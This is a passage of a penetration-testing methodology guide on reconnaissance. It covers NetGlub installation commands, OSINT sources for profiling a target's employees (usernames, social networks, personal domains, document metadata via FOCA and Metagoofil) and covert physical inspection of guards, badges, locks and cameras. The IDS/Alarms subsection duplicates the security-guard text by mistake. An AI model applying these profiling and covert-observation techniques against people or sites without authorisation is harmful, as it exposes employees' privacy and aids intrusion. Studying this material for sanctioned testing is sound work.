<span class="n">python2</span><span class="o">.</span><span class="mi">7</span> <span class="n">setup</span><span class="o">.</span><span class="n">py</span> <span class="n">build</span>
<span class="n">python2</span><span class="o">.</span><span class="mi">7</span> <span class="n">setup</span><span class="o">.</span><span class="n">py</span> <span class="n">install</span>
<span class="n">cd</span> <span class="o">..</span>
<span class="n">wget</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">sourceforge</span><span class="o">.</span><span class="n">net</span><span class="o">/</span><span class="n">projects</span><span class="o">/</span><span class="n">pyxml</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="n">pyxml</span><span class="o">/</span><span class="mf">0.8</span><span class="o">.</span><span class="mi">4</span><span class="o">/</span><span class="n">PyXML</span><span class="o">-</span><span class="mf">0.8</span><span class="o">.</span><span class="mf">4.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
<span class="n">tar</span> <span class="o">-</span><span class="n">xvzf</span> <span class="n">PyXML</span><span class="o">-</span><span class="mf">0.8</span><span class="o">.</span><span class="mf">4.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
<span class="n">cd</span> <span class="n">PyXML</span><span class="o">-</span><span class="mf">0.8</span><span class="o">.</span><span class="mi">4</span>
<span class="n">wget</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">launchpadlibrarian</span><span class="o">.</span><span class="n">net</span><span class="o">/</span><span class="mi">31786748</span><span class="o">/</span><span class="mi">0001</span><span class="o">-</span><span class="n">Patch</span><span class="o">-</span><span class="k">for</span><span class="o">-</span><span class="n">Python</span><span class="o">-</span><span class="mf">2.6</span><span class="o">.</span><span class="n">patch</span>
<span class="n">patch</span> <span class="o">-</span><span class="n">p1</span> <span class="o">&lt;</span> <span class="mi">0001</span><span class="o">-</span><span class="n">Patch</span><span class="o">-</span><span class="k">for</span><span class="o">-</span><span class="n">Python</span><span class="o">-</span><span class="mf">2.6</span><span class="o">.</span><span class="n">patch</span>
<span class="n">python</span> <span class="n">setup</span><span class="o">.</span><span class="n">py</span> <span class="n">install</span>
<span class="n">cd</span> <span class="o">/</span><span class="n">pentest</span><span class="o">/</span><span class="n">enumeration</span>
</pre></div>
</div>
<p>At this point we&#8217;re going to use a GUI installation of the QT-SDK. The
main thing to point out here is that the installation path needs to be
changed during the installation to reflect /opt/qtsdk. If you use a
different path, then you will need to update the paths in the script
below to reflect that difference.</p>
<p>Note that during the QT-SDK installation we are reminded for external
dependencies, so make sure we run &#8220;apt-get install libglib2.0-dev
libSM-dev libxrender-dev libfontconfig1-dev libxext-dev&#8221;.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">wget</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">blog</span><span class="o">.</span><span class="n">hynesim</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ressources</span><span class="o">/</span><span class="n">install</span><span class="o">/</span><span class="n">qt</span><span class="o">-</span><span class="n">sdk</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="n">opensource</span><span class="o">-</span><span class="mf">2010.03</span><span class="o">.</span><span class="n">bin</span>
<span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="n">qt</span><span class="o">-</span><span class="n">sdk</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="n">opensource</span><span class="o">-</span><span class="mf">2010.03</span><span class="o">.</span><span class="n">bin</span>
<span class="o">./</span><span class="n">qt</span><span class="o">-</span><span class="n">sdk</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="n">opensource</span><span class="o">-</span><span class="mf">2010.03</span><span class="o">.</span><span class="n">bin</span>
<span class="n">wget</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">graphviz</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">pub</span><span class="o">/</span><span class="n">graphviz</span><span class="o">/</span><span class="n">stable</span><span class="o">/</span><span class="n">SOURCES</span><span class="o">/</span><span class="n">graphviz</span><span class="o">-</span><span class="mf">2.26</span><span class="o">.</span><span class="mf">3.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
<span class="n">tar</span> <span class="o">-</span><span class="n">xzvf</span> <span class="n">graphviz</span><span class="o">-</span><span class="mf">2.26</span><span class="o">.</span><span class="mf">3.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
<span class="n">cd</span> <span class="n">graphviz</span><span class="o">-</span><span class="mf">2.26</span><span class="o">.</span><span class="mi">3</span>
<span class="o">./</span><span class="n">configure</span>
<span class="n">make</span>
<span class="n">make</span> <span class="n">install</span>
<span class="n">cd</span> <span class="o">/</span><span class="n">pentest</span><span class="o">/</span><span class="n">enumeration</span>
<span class="n">wget</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">redmine</span><span class="o">.</span><span class="n">lab</span><span class="o">.</span><span class="n">diateam</span><span class="o">.</span><span class="n">net</span><span class="o">/</span><span class="n">attachments</span><span class="o">/</span><span class="n">download</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="n">netglub</span><span class="o">-</span><span class="mf">1.0</span><span class="o">.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
<span class="n">tar</span> <span class="o">-</span><span class="n">xzvf</span> <span class="n">netglub</span><span class="o">-</span><span class="mf">1.0</span><span class="o">.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
<span class="n">mv</span> <span class="n">netglub</span><span class="o">-</span><span class="mf">1.0</span> <span class="n">netglub</span>
<span class="n">cd</span> <span class="o">/</span><span class="n">pentest</span><span class="o">/</span><span class="n">enumeration</span><span class="o">/</span><span class="n">netglub</span><span class="o">/</span><span class="n">qng</span><span class="o">/</span>
<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">qtsdk</span><span class="o">/</span><span class="n">qt</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">qmake</span>
<span class="n">make</span>
</pre></div>
</div>
<p>Now we need to start MySQL and create the netglub database</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">start</span> <span class="n">mysql</span>
<span class="n">mysql</span> <span class="o">-</span><span class="n">u</span> <span class="n">root</span> <span class="o">-</span><span class="n">ptoor</span>

<span class="n">create</span> <span class="n">database</span> <span class="n">netglub</span><span class="p">;</span>
<span class="n">use</span> <span class="n">netglub</span><span class="p">;</span>
<span class="n">create</span> <span class="n">user</span> <span class="s2">&quot;netglub&quot;</span><span class="o">@</span><span class="s2">&quot;localhost&quot;</span><span class="p">;</span>
<span class="nb">set</span> <span class="n">password</span> <span class="k">for</span> <span class="s2">&quot;netglub&quot;</span><span class="o">@</span><span class="s2">&quot;localhost&quot;</span> <span class="o">=</span> <span class="n">password</span><span class="p">(</span><span class="s2">&quot;netglub&quot;</span><span class="p">);</span>
<span class="n">GRANT</span> <span class="n">ALL</span> <span class="n">ON</span> <span class="n">netglub</span><span class="o">.*</span> <span class="n">TO</span> <span class="s2">&quot;netglub&quot;</span><span class="o">@</span><span class="s2">&quot;localhost&quot;</span><span class="p">;</span>
<span class="n">quit</span>

<span class="n">mysql</span> <span class="o">-</span><span class="n">u</span> <span class="n">root</span> <span class="o">-</span><span class="n">ptoor</span> <span class="n">netglub</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">pentest</span><span class="o">/</span><span class="n">enumeration</span><span class="o">/</span><span class="n">netglub</span><span class="o">/</span><span class="n">master</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">sql</span><span class="o">/</span><span class="n">netglub</span><span class="o">.</span><span class="n">sql</span>

<span class="n">cd</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">qtsdk</span><span class="o">/</span><span class="n">qt</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">sqldrivers</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span>
<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">qtsdk</span><span class="o">/</span><span class="n">qt</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">qmake</span> <span class="n">INCLUDEPATH</span><span class="o">+=/</span><span class="n">usr</span><span class="o">/</span><span class="n">include</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span>
<span class="n">make</span>
<span class="n">cp</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">qtsdk</span><span class="o">/</span><span class="n">qt</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">sqldrivers</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">libqsqlmysql</span><span class="o">.</span><span class="n">so</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">qtsdk</span><span class="o">/</span><span class="n">qt</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">sqldrivers</span><span class="o">/.</span>
<span class="n">cd</span> <span class="o">/</span><span class="n">pentest</span><span class="o">/</span><span class="n">enumeration</span><span class="o">/</span><span class="n">netglub</span><span class="o">/</span><span class="n">master</span>
<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">qtsdk</span><span class="o">/</span><span class="n">qt</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">qmake</span>
<span class="n">make</span>
<span class="n">cd</span> <span class="n">tools</span><span class="o">/</span>
<span class="o">./</span><span class="n">install</span><span class="o">.</span><span class="n">sh</span>
<span class="n">cd</span> <span class="o">/</span><span class="n">pentest</span><span class="o">/</span><span class="n">enumeration</span><span class="o">/</span><span class="n">netglub</span><span class="o">/</span><span class="n">slave</span>
<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">qtsdk</span><span class="o">/</span><span class="n">qt</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">qmake</span>
<span class="n">make</span>
<span class="n">cd</span> <span class="n">tools</span><span class="o">/</span>
<span class="o">./</span><span class="n">install</span><span class="o">.</span><span class="n">sh</span>
<span class="n">wget</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">sourceforge</span><span class="o">.</span><span class="n">net</span><span class="o">/</span><span class="n">projects</span><span class="o">/</span><span class="n">xmlrpc</span><span class="o">-</span><span class="n">c</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="n">Xmlrpc</span><span class="o">-</span><span class="n">c</span><span class="o">%</span><span class="mi">20</span><span class="n">Super</span><span class="o">%</span><span class="mi">20</span><span class="n">Stable</span><span class="o">/</span><span class="mf">1.16</span><span class="o">.</span><span class="mi">34</span><span class="o">/</span><span class="n">xmlrpc</span><span class="o">-</span><span class="n">c</span><span class="o">-</span><span class="mf">1.16</span><span class="o">.</span><span class="mf">34.</span><span class="n">tgz</span><span class="o">/</span><span class="n">download</span>
<span class="n">tar</span> <span class="o">-</span><span class="n">zxvf</span> <span class="n">xmlrpc</span><span class="o">-</span><span class="n">c</span><span class="o">-</span><span class="mf">1.16</span><span class="o">.</span><span class="mf">34.</span><span class="n">tgz</span>
<span class="n">cd</span> <span class="n">xmlrpc</span><span class="o">-</span><span class="n">c</span><span class="o">-</span><span class="mf">1.16</span><span class="o">.</span><span class="mi">34</span>
<span class="o">./</span><span class="n">configure</span>
<span class="n">make</span>
<span class="n">make</span> <span class="n">install</span>
</pre></div>
</div>
<p>Once you have installed NetGlub, you&#8217;ll probably be interested in
running it. This is really a four step process: Ensure that MySQL is
running:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">start</span> <span class="n">mysql</span>
</pre></div>
</div>
<p>Start the NetGlub Master:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">/</span><span class="n">pentest</span><span class="o">/</span><span class="n">enumeration</span><span class="o">/</span><span class="n">netglub</span><span class="o">/</span><span class="n">master</span><span class="o">/</span><span class="n">master</span>
</pre></div>
</div>
<p>Start the NetGlub Slave:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">/</span><span class="n">pentest</span><span class="o">/</span><span class="n">enumeration</span><span class="o">/</span><span class="n">netglub</span><span class="o">/</span><span class="n">slave</span><span class="o">/</span><span class="n">slave</span>
</pre></div>
</div>
<p>Start the NetGlub GUI:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">/</span><span class="n">pentest</span><span class="o">/</span><span class="n">enumeration</span><span class="o">/</span><span class="n">netglub</span><span class="o">/</span><span class="n">qng</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">unix</span><span class="o">-</span><span class="n">debug</span><span class="o">/</span><span class="n">netglub</span>
</pre></div>
</div>
<p>Now the main interface should be visible. If you are familiar with
Maltego, then you will feel right at home with the interface. The six
main areas of the interface are the toolbar, the Palette, graph, (or
view) area, details, and the property area.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_166.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</p>
<p>A complete list of all the transforms that are available (or activated)
for use. As of this writing, there are approximately 33 transforms. A
transform is script that will actually perform the action against a
given site.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_167.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</p>
<p>The graph area allows you to process the transforms as well as view the
data in either the mining view, dynamic view, edge weighted view as well
as the entity list. The overview area provides a mini-map of the
entities discovered based upon the transforms. The detail area is where
it is possible to drill into the specifics of the entity. It is possible
to view such things as the relationships, as well as details of how the
information was generated. The property area allows you to see the
specific properties of the transform populated with the results specific
to the entity. To begin using NetGlub we need to drag and drop a
transform from the Palette to the Graph Area. By default, this will be
populated with dummy data. To edit the entity within the selected
transform, do so by editing the entries within the property view.</p>
<p>We first need to determine the Internet infrastructure such as Domains.
To perform this we will drag and drop the Domain transform to the graph
area. Edit the transform to reflect the appropriate domain name for the
client. It is possible to collect nearly all the data that we will
initially require by clicking on Run All Transforms.</p>
<p>The data from these entities will be used to obtain additional
information. Within the graph area the results will be visible as
illustrated below.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_168.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</p>
<p>Selecting the entities and choosing to run additional transforms the
data collected will expand. If a particular transform has not be used
that you want to collect data from, simply drag it to the graph area and
make the appropriate changes within the property view.</p>
<p>There will be some information that you will need to enter to ensure
that NetGlub functions properly. For example, you will need to enter in
DNS servers which to query. In addition, you will be asked to provide
your Alchemy and Open calais API keys.</p>
<p>For Alchemy, you will need to go to
<a class="reference external" href="http://www.alchemyapi.com/api/register.html">http://www.alchemyapi.com/api/register.html</a>
to receive your own API key. For Open calais, you will need to go to
<a class="reference external" href="http://www.opencalais.com/APIkey">http://www.opencalais.com/APIkey</a>
to receive your own API key.</p>
</div>
</div>
<div class="section" id="usernames-handles">
<h4>Usernames/Handles<a class="headerlink" href="#usernames-handles" title="Permalink to this headline">¶</a></h4>
<p>Identifying usernames and handles that are associated with a particular
email is useful as this might provide several key pieces of information.
For instance, it could provide a significant clue for username and
passwords. In addition, it can also indicate a particular individual&#8217;s
interest outside of work. A good place to location this type of
information is within discussion groups (Newsgroups, Mailing lists,
forums, chat rooms, etc.).</p>
</div>
<div class="section" id="social-networks">
<h4>Social Networks<a class="headerlink" href="#social-networks" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="http://www.checkusernames.com/">Check Usernames</a> - Useful for
checking the existence of a given username across 160 Social
Networks.</li>
</ul>
<div class="section" id="newsgroups">
<h5>Newsgroups<a class="headerlink" href="#newsgroups" title="Permalink to this headline">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="http://www.google.com/">Google</a> -
<a class="reference external" href="http://www.google.com/">http://www.google.com</a></li>
<li><a class="reference external" href="http://groups.yahoo.com/">Yahoo Groups</a> -
<a class="reference external" href="http://groups.yahoo.com/">http://groups.yahoo.com</a></li>
<li><a class="reference external" href="http://www.delphiforums.com/">Delphi Forums&nbsp;</a> -
<a class="reference external" href="http://www.delphiforums.com/">http://www.delphiforums.com</a></li>
<li><a class="reference external" href="http://www.big-boards.com/">Big Boards</a> -
<a class="reference external" href="http://www.big-boards.com/">http://www.big-boards.com</a></li>
</ul>
</div>
<div class="section" id="mailing-lists">
<h5>Mailing Lists<a class="headerlink" href="#mailing-lists" title="Permalink to this headline">¶</a></h5>
<ul class="simple">
<li>TILE.Net - <a class="reference external" href="http://tile.net/lists">http://tile.net/lists</a></li>
<li>Topica - <a class="reference external" href="http://lists.topica.com/">http://lists.topica.com</a></li>
<li>L-Soft CataList, the Official Catalog of LISTSERV lists -
<a class="reference external" href="http://www.lsoft.com/lists/listref.html">http://www.lsoft.com/lists/listref.html</a></li>
<li>The Mail Archive -
<a class="reference external" href="http://www.mail-archive.com/">http://www.mail-archive.com</a></li>
</ul>
</div>
<div class="section" id="chat-rooms">
<h5>Chat Rooms<a class="headerlink" href="#chat-rooms" title="Permalink to this headline">¶</a></h5>
<ul class="simple">
<li>SearchIRC - <a class="reference external" href="http://searchirc.com/">http://searchirc.com</a></li>
<li>Gogloom - <a class="reference external" href="http://www.gogloom.com/">http://www.gogloom.com</a></li>
</ul>
</div>
<div class="section" id="forums-search">
<h5>Forums Search<a class="headerlink" href="#forums-search" title="Permalink to this headline">¶</a></h5>
<ul class="simple">
<li>BoardReader - <a class="reference external" href="http://boardreader.com/">http://boardreader.com</a></li>
<li>Omgili - <a class="reference external" href="http://www.omgili.com/">http://www.omgili.com</a></li>
</ul>
</div>
</div>
<div class="section" id="personal-domain-names">
<h4>Personal Domain Names<a class="headerlink" href="#personal-domain-names" title="Permalink to this headline">¶</a></h4>
<p>The ability to locate personal domains that belong to target employees
can yield additional information such as potential usernames and
passwords. In addition, it can also indicate a particular individual&#8217;s
interest outside of work.</p>
</div>
<div class="section" id="personal-activities">
<h4>Personal Activities<a class="headerlink" href="#personal-activities" title="Permalink to this headline">¶</a></h4>
<p>It is not uncommon for individuals to create and publish audio files and
videos. While these may be seem insignificant, they can yield additional
information about a particular individual&#8217;s interest outside of work.</p>
<div class="section" id="audio">
<h5>Audio<a class="headerlink" href="#audio" title="Permalink to this headline">¶</a></h5>
<ul class="simple">
<li>iTunes -
<a class="reference external" href="http://www.apple.com/itunes">http://www.apple.com/itunes</a></li>
<li>Podcast.com - <a class="reference external" href="http://podcast.com/">http://podcast.com</a></li>
<li>Podcast Directory -
<a class="reference external" href="http://www.podcastdirectory.com/">http://www.podcastdirectory.com</a></li>
<li>Yahoo! Audio Search -
<a class="reference external" href="http://audio.search.yahoo.com/">http://audio.search.yahoo.com</a></li>
</ul>
</div>
<div class="section" id="video">
<h5>Video<a class="headerlink" href="#video" title="Permalink to this headline">¶</a></h5>
<ul class="simple">
<li>YouTube - <a class="reference external" href="http://youtube.com/">http://youtube.com</a></li>
<li>Yahoo Video -
<a class="reference external" href="http://video.search.yahoo.com/">http://video.search.yahoo.com</a></li>
<li>Google Video - <a class="reference external" href="http://video.google.com/">http://video.google.com</a></li>
<li>Bing Video -
<a class="reference external" href="http://www.bing.com/videos">http://www.bing.com/videos</a></li>
</ul>
</div>
</div>
<div class="section" id="archived-information">
<h4>Archived Information<a class="headerlink" href="#archived-information" title="Permalink to this headline">¶</a></h4>
<div class="line-block">
<div class="line">There are times when we will be unable to access web site information
due to the fact that the content may no longer be available from the
original source. Being able to access archived copies of this
information allows access to past information. There are several ways
to access this archived information. The primary means is to utilize
the cached results under Google&#8217;s cached results. As part of an NVA,
it is not uncommon to perform Google searches using specially targeted
search strings:</div>
<div class="line">cache:&lt;site.com&gt;</div>
</div>
<p>Note: Replace &lt;site.com&gt; with the name of the domain that you wish to
perform the search on.</p>
<p>An additional resource for archived information is the Wayback Machine
(<a class="reference external" href="http://www.archive.org">http://www.archive.org</a>).</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_09.png">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
</div>
<div class="section" id="electronic-data">
<h4>Electronic Data<a class="headerlink" href="#electronic-data" title="Permalink to this headline">¶</a></h4>
<p>Collection of electronic data in direct response to reconnaissance and
intelligence gathering should be focused on the target business or
individual.</p>
<div class="section" id="document-leakage">
<h5>Document leakage<a class="headerlink" href="#document-leakage" title="Permalink to this headline">¶</a></h5>
<p>Publicly available documents should be gathered for essential data
(date, time, location specific information, language, and author). Data
collected could provide insight into the current environment,
operational procedures, employee training, and human resources.</p>
</div>
<div class="section" id="metadata-leakage">
<h5>Metadata leakage<a class="headerlink" href="#metadata-leakage" title="Permalink to this headline">¶</a></h5>
<p>Identifying Metadata is possible using specialized search engine. The
goal is to identify data that is relevant to the target corporation. It
may be possible to identify locations, hardware, software and other
relevant data from Social Networking posts. Some search engines that
provide the ability to search for Metadata are as follows:</p>
<ul class="simple">
<li>ixquick - <a class="reference external" href="http://ixquick.com/">http://ixquick.com</a></li>
<li>MetaCrawler - <a class="reference external" href="http://metacrawler.com/">http://metacrawler.com</a></li>
<li>Dogpile&nbsp; - <a class="reference external" href="http://www.dogpile.com/">http://www.dogpile.com</a></li>
<li>Search.com - <a class="reference external" href="http://www.search.com/">http://www.search.com</a></li>
<li>Jeffery&#8217;s Exif Viewer -
<a class="reference external" href="http://regex.info/exif.cgi">http://regex.info/exif.cgi</a></li>
</ul>
<p>In addition to search engines, several tools exist to collect files and
gather information from various documents.</p>
<p>FOCA (Windows)</p>
<p>FOCA is a tool that reads metadata from a wide range of document and
media formats. FOCA pulls the relevant usernames, paths, software
versions, printer details, and email addresses. This can all be
performed without the need to individually download files.</p>
<p>Foundstone SiteDigger (Windows)</p>
<div class="line-block">
<div class="line">Foundstone has a tool, named SiteDigger, which allows us to search a
domain using specially strings from both the Google Hacking Database
(GHDB) and Foundstone Database (FSDB). This allows for slightly over
1640 potential queries available to discover additional information.</div>
<div class="line">&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_10.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</div>
</div>
<p>The specific queries scanned as well as the results of the queries are
shown. To access the results of a query, simply double-click on the link
provided to open in a browser.</p>
<p>Metagoofil (Linux/Windows)</p>
<p>Metagoofil is a Linux based information gathering tool designed for
extracting metadata of public documents (.pdf, .doc, .xls, .ppt, .odp,
.ods) available on the client&#8217;s websites.</p>
<p>Metagoofil generates an html results page with the results of the
metadata extracted, plus a list of potential usernames that could prove
useful for brute force attacks. It also extracts paths and MAC address
information from the metadata.</p>
<p>Metagoofil has a few options available, but most are related to what
specifically you want to target as well the number of results desired.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_11.png">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>The command to run &#8216;&#8217;metagoofil &#8216;&#8217;is as follows:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">metagoofil</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">d</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">client</span> <span class="n">domain</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">l</span> <span class="mi">100</span> <span class="o">-</span><span class="n">f</span> <span class="nb">all</span> <span class="o">-</span><span class="n">o</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">client</span> <span class="n">domain</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;.</span><span class="n">html</span> <span class="o">-</span><span class="n">t</span> <span class="n">micro</span><span class="o">-</span><span class="n">files</span>
</pre></div>
</div>
<p>Exif Reader (Windows)</p>
<p>Exif Reader is image file analysis software for Windows. It analyzes and
displays the shutter speed, flash condition, focal length, and other
image information included in the Exif image format which is supported
by almost all the latest digital cameras. Exif image files with an
extension of JPG can be treated in the same manner as conventional JPEG
files. This software analyzes JPEG files created by digital cameras and
can be downloaded from
<a class="reference external" href="http://www.takenet.or.jp/~ryuuji/minisoft/exifread/english">http://www.takenet.or.jp/~ryuuji/minisoft/exifread/english</a>.</p>
<p>ExifTool (Windows/ OS X)</p>
<p>Exif Tool is a Windows and OS X tool for reading Meta information.
ExifTool supports a wide range of file formats. ExifTool can be
downloaded from
<a class="reference external" href="http://www.sno.phy.queensu.ca/~phil/exiftool">http://www.sno.phy.queensu.ca/~phil/exiftool</a>.</p>
<p>Image Search</p>
<p>While not directly related to metadata, Tineye is also useful:
<a class="reference external" href="http://www.tineye.com/">http://www.tineye.com/</a> If a profile is found that includes a picture,
but not a real name, Tineye can sometimes be used to find other profiles
on the Internet that may have more information about a person (including
personals sites).</p>
</div>
</div>
</div>
<div class="section" id="covert-gathering">
<h3>Covert gathering<a class="headerlink" href="#covert-gathering" title="Permalink to this headline">¶</a></h3>
<div class="section" id="on-location-gathering">
<h4>On-location gathering<a class="headerlink" href="#on-location-gathering" title="Permalink to this headline">¶</a></h4>
<p>On-Site visits also allow assessment personnel to observe and gather
information about the physical, environmental, and operational security
of the target.</p>
<div class="section" id="adjacent-facilities">
<h5>Adjacent Facilities<a class="headerlink" href="#adjacent-facilities" title="Permalink to this headline">¶</a></h5>
<p>Once the physical locations have been identified, it is useful to
identify the adjacent facilities. Adjacent facilities should be
documented and if possible, include any observed shared facilities or
services.</p>
</div>
<div class="section" id="physical-security-inspections">
<h5>Physical security inspections<a class="headerlink" href="#physical-security-inspections" title="Permalink to this headline">¶</a></h5>
<p>Covert Physical security inspections are used to ascertain the security
posture of the target. These are conducted covertly, clandestinely and
without any party knowing they are being inspected. Observation is the
key component of this activity. Physical security measures that should
be observed include physical security equipment, procedures, or devices
used to protect from possible threats. A physical security inspection
should include, but is not limited to the following:</p>
<p>Security guards</p>
<p>Observing security guards (or security officer) is often the first step
in assessing the most visible deterrence. Security guards are uniformed
and act to protect property by maintaining a high visibility presence to
deter illegal and inappropriate actions. By observing security guard
movements directly it is possible to determine procedures in use or
establish movement patterns. You will need to observe what the security
guards are protecting. It is possible to utilize binoculars to observe
any movement from a safe distance.</p>
<p>Some security guards are trained and licensed to carry firearms for
their own safety and for personnel they are entrusted to protect. The
use of firearms by security guards should not be a surprise, if noted.
This should be documented prior to beginning the engagement. If firearms
are observed, ensure that precaution is taken not to take any further
action unless specifically authorized and trained to do so.</p>
<p>Badge Usage</p>
<p>Badge usage refers to a physical security method that involves the use
of identification badges as a form of access control. Badging systems
may be tied to a physical access control system or simply used as a
visual validation mechanism. Observing individual badge usage is
important to document. By observing, badge usage it may be possible to
actually duplicate the specific badge being utilized. The specific items
that should be noted are if the badge is required to be visible or shown
to gain physical access to the property or facility. Badge usage should
be documented and if possible, include observed validation procedures.</p>
<p>Locking devices</p>
<p>A locking device is a mechanical or electronic mechanism often
implemented to prevent unauthorized ingress or egress. These can be as
simple as a door lock, dead-bolt, or complex as a cipher lock. Observing
the type and placement location of the locking devices on doors it is
possible to determine if the door in primarily used for ingress or
egress. You will need to observe what the locking devices are
protecting. All observations should be documented prior, and if possible
photographs taken.</p>
<p>Intrusion detection systems (IDS)/Alarms</p>
<p>Observing security guards (or security officer) is often the first step
in assessing the most visible deterrence. Security guards are uniformed
and act to protect property by maintaining a high visibility presence to
deter illegal and inappropriate actions. By observing security guard
movements directly it is possible to determine procedures in use or
establish movement patterns. You will need to observe what the security
guards are protecting. It is possible to utilize binoculars to observe
any movement from a safe distance.</p>
<p>Some security guards are trained and licensed to carry firearms for
their own safety and for personnel they are entrusted to protect. The
use of firearms by security guards should not be a surprise, if noted.
This should be documented prior to beginning the engagement. If firearms
are observed, ensure that precaution is taken not to take any further
action unless specifically authorized and trained to do so.</p>
<p>Security lighting</p>
<p>Security lighting is often used as a preventative and corrective measure
on a physical piece of property. Security lighting may aid in the
detection of intruders, act as deterrence to intruders, or in some cases
simply to increase the feeling of safety. Security lighting is often an
integral component to the environmental design of a facility. Security
lighting includes floodlights and low pressure sodium vapor lights. Most
Security lighting that is intended to be left on all night is of the
high-intensity discharge lamp variety. Other lights may be activated by
sensors such as passive infrared sensors (PIRs), turning on only when a
person (or other mammal) approaches. PIR activated lamps will usually be
incandescent bulbs so that they can activate instantly; energy saving is
less important since they will not be on all the time. PIR sensor
activation can increase both the deterrent effect (since the intruder
knows that he has been detected) and the detection effect (since a
person will be attracted to the sudden increase in light). Some PIR
units can be set up to sound a chime as well as turn on the light. Most
modern units have a photocell so that they only turn on when it is dark.</p>
<p>While adequate lighting around a physical structure is deployed to
reduce the risk of an intrusion, it is critical that the lighting be
implemented properly as poorly arranged lighting can actually obstruct
viewing the facility they&#8217;re designed to protect.</p>
<p>Security lighting may be subject to vandalism, possibly to reduce its
effectiveness for a subsequent intrusion attempt. Thus security lights
should either be mounted very high, or else protected by wire mesh or
tough polycarbonate shields. Other lamps may be completely recessed from
view and access, with the light directed out through a light pipe, or
reflected from a polished aluminum or stainless steel mirror. For
similar reasons high security installations may provide a stand-by power
supply for their security lighting. Observe and document the type,
number, and locations of security lighting in use.</p>
<p>Surveillance /CCTV systems</p>
<p>Surveillance/CCTV systems may be used to observe activities in and
around a facility from a centralized area. Surveillance/CCTV systems may
operate continuously or only when activated as required to monitor a
particular event. More advanced Surveillance/CCTV systems utilize
motion-detection devices to activate the system. IP-based
Surveillance/CCTV cameras may be implemented for a more decentralized
operation.</p>
<p>Surveillance/CCTV cameras can be of a conspicuous nature, which are used
